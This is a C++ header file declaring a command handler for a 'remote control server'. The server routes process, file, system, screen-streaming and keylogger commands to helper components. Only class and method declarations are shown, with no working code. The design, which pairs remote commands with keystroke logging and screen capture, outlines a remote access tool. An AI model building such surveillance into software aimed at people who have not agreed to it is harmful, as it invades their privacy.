#pragma once

#include <string>
#include <memory>
#include <vector>

// Forward declarations
class Logger;
class ThreadManager;
class ProcessManager;
class AppManager;
class ScreenCapture;
class ServerController;
class LivestreamServer;
class KeyloggerSender;

/**
 * @brief Handles command processing for the remote control server
 *
 * CommandHandler encapsulates all command processing logic, making the main
 * server code cleaner and more maintainable. It handles all supported commands
 * including process management, application control, file operations, and system control.
 */
class CommandHandler
{
private:
	Logger *logger;
	ThreadManager *threadManager;
	ProcessManager *processManager;
	AppManager *appManager;
	ScreenCapture *screenCapture;
	ServerController *serverController;
	LivestreamServer *livestreamServer;
	KeyloggerSender *keyloggerServer;

	// Helper methods for specific command categories
	std::string handleProcessCommands(const std::string &command);
	std::string handleAppCommands(const std::string &command);
	std::string handleFileCommands(const std::string &command);
	std::string handleSystemCommands(const std::string &command);
	std::string handleStreamingCommands(const std::string &command);
	std::string handleKeyloggerCommands(const std::string &command);

	// New chunked data transfer handlers
	std::string handleProcessCommandsChunked(const std::string &command);
	std::string handleFileCommandsChunked(const std::string &command);

	// Helper method for LS command processing
	std::string generateDirectoryListing(const std::string &dirPath);

public:
	/**
	 * @brief Constructor for CommandHandler
	 * @param logger Logger instance for logging command processing
	 * @param threadManager ThreadManager for task execution
	 * @param processManager ProcessManager for process operations
	 * @param appManager AppManager for application operations
	 * @param screenCapture ScreenCapture for screen operations
	 * @param serverController ServerController for network operations
	 * @param livestreamServer LivestreamServer for streaming operations
	 * @param keyloggerServer KeyloggerSender for keylogging operations
	 */
	CommandHandler(
			Logger *logger,
			ThreadManager *threadManager,
			ProcessManager *processManager,
			AppManager *appManager,
			ScreenCapture *screenCapture,
			ServerController *serverController,
			LivestreamServer *livestreamServer,
			KeyloggerSender *keyloggerServer);

	/**
	 * @brief Process a command and return the response
	 * @param command The command string to process
	 * @return Response string to send back to client
	 */
	std::string processCommand(const std::string &command);

	/**
	 * @brief Check if a command requires server shutdown
	 * @param command The command to check
	 * @return True if the command requires server shutdown
	 */
	bool isShutdownCommand(const std::string &command) const;

	/**
	 * @brief Get list of supported commands
	 * @return Vector of supported command names
	 */
	std::vector<std::string> getSupportedCommands() const;
};
